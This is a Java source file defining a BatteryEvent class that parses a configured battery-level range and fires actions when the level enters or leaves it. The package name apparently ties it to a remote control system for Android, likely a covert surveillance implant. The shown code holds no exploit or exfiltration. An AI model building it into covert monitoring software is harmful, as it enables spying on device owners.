package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.util.Log;
import android.widget.Toast;

import com.ht.RCSAndroidGUI.Battery;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.utils.DataBuffer;

public class BatteryEvent extends EventBase {
	/** The Constant TAG. */
	private static final String TAG = "BatteryEvent";
		
	private Status status;
	private int exitAction, minLevel, maxLevel;
	private boolean inRange = false;
	
	@Override
	public void begin() {
		status = Status.self();
		
		status.attachToBattery(this);
	}

	@Override
	public void end() {
		status.detachFromBattery(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();

		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
		
		try {
			exitAction = databuffer.readInt();
			minLevel = databuffer.readInt();
			maxLevel = databuffer.readInt();
			
			Log.d("QZ", TAG + " exitAction: " + exitAction + " minLevel:" + minLevel + " maxLevel:" + maxLevel);
		} catch (final IOException e) {
			Log.d("QZ", TAG + " Error: params FAILED");
			return false;
		}
		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub
	}

	public void batteryNotification(Battery b) {
		Log.d("QZ", TAG + " Got battery notification: " + b.getBatteryLevel() + "%");
		
		if (minLevel > maxLevel)
			return;
		
		// Nel range
		if ((b.getBatteryLevel() >= minLevel && b.getBatteryLevel() <= maxLevel) && inRange == false) {
			inRange = true;

			trigger();
		}
     
		// Fuori dal range
		if ((b.getBatteryLevel() < minLevel || b.getBatteryLevel() > maxLevel) && inRange == true) {
			inRange = false;

			trigger(exitAction);
		}
	}
}
